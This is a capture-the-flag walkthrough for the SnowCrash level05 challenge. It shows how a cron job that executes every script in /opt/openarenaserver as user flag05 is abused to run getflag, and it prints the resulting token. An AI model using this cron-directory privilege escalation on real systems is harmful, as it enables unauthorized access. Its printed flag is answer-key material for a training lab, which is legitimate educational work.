# Level 05

- Once logged in,  `You have new mail.` message shows on the prompt

```
???$ ssh level05@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level05@localhost's password:
You have new mail.
level05@SnowCrash:~$
```

### Why does terminal say: "You have new mail"?
- ref: https://superuser.com/questions/25738/why-does-terminal-say-you-have-mail


```
Somehow you've had a script or something similar deliver mail to your account on your local machine which is stored in /var/mail/$USER...
```

let's checkout `/var/mail/$USER`

```
level05@SnowCrash:~$ cat /var/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
- above `cron` job does is in every 2nd minute, the script `su -c "sh /usr/sbin/openarenaserver" - flag05` will be run.
	- notice `- flag05`, it runs by the user `flag05`

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$
```

- for every file in `/opt/openarenaserver` directory, it executes the `ulimit -t 5; bash -x "$i"`, and `rm -f "$i"`, which is remove the file that is executed

let's make a script that runs in directory `/opt/openarenaserver`
```
level05@SnowCrash:/opt/openarenaserver$ cat getflag.sh
#!/bin/bash
/bin/getflag > /tmp/flag
...
level05@SnowCrash:/opt/openarenaserver$ chmod +x getflag.sh
```

and `watch` until the flag is created
```
level05@SnowCrash:/opt/openarenaserver$ watch -n 1 cat /tmp/flag
Every 1.0s: cat /tmp/flag                                    Wed May 11 00:24:01 2022

(nothing here)
```
and wait...
```
level05@SnowCrash:/opt/openarenaserver$ watch -n 1 cat /tmp/flag
Every 1.0s: cat /tmp/flag                                    Wed May 11 00:24:01 2022

Check flag.Here is your token : viuaaale9huek52boumoomioc
```
